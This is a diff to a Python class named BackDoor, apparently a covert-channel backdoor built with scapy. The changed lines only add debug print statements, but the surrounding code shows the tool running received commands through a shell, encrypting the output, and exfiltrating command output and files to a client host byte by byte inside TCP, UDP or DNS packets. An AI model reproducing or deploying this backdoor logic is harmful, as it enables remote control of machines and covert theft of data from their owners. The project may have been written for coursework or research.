@@ -253,10 +253,11 @@ class BackDoor:
             filename = path.split("/")[-1]
             binary_data = self.get_file_bin(path)
         else:
+            print("getting binary for command")
             binary_data = self.get_bin(data)
 
         if self.proto == "tcp":
-            print(f"sending {self.proto}")
+            print(f"Now creating packet to send {binary_data, filename}")
             self.create_tcp(binary_data, filename)
         elif self.proto == "udp":
             print(f"sending {self.proto}")
@@ -270,14 +271,17 @@ class BackDoor:
             terminator = name.encode() + b'\x00'
             src = self.file_port
         else:
+
             src = RandShort()
             terminator = b'\x00'
+            print(f"set src and terminator {src, terminator}")
         return src, terminator
 
     def create_tcp(self, data: List, name: str) -> None:
         """Creates a TCP packet and embeds data in payload"""
         print("Creating TCP packets")
         src, terminator = self.set_terminator(name)
+        print(f"got src and terminator {src, terminator}")
         packets = []
         for index, byte in enumerate(data):
             packet = IP(dst=self.client) / TCP(sport=src, dport=self.send_port) / Raw(load=byte)
@@ -286,6 +290,7 @@ class BackDoor:
         # Add packet to specify end of msg
         packet = IP(dst=self.client) / TCP(sport=src, dport=self.send_port) / Raw(load=terminator)
         packets.append(packet)
+        print(f"packet array done: {packets}")
         self.send_pkt(packets)
 
     def create_dns(self, data: List, name: str) -> None:
@@ -385,7 +390,7 @@ class BackDoor:
         cmd = self.flag_begin + cmd + self.flag_close
         encrypted_data = self.encrypt_data(cipher, cmd)
         # Convert the encrypted string to bytes
-        print("Preparing response.....")
+        print("Encrypted response")
         return encrypted_data
 
     def get_hex_string(self, encrypted_line):
@@ -411,6 +416,7 @@ class BackDoor:
         output = run(cmd, shell=True, capture_output=True, text=True)
         output = output.stdout
         msg = self.prepare_msg(output)
+        print("Now calling prepare data")
         self.prepare_data("", msg)
 
     def filter_packets(self, packet) -> None:
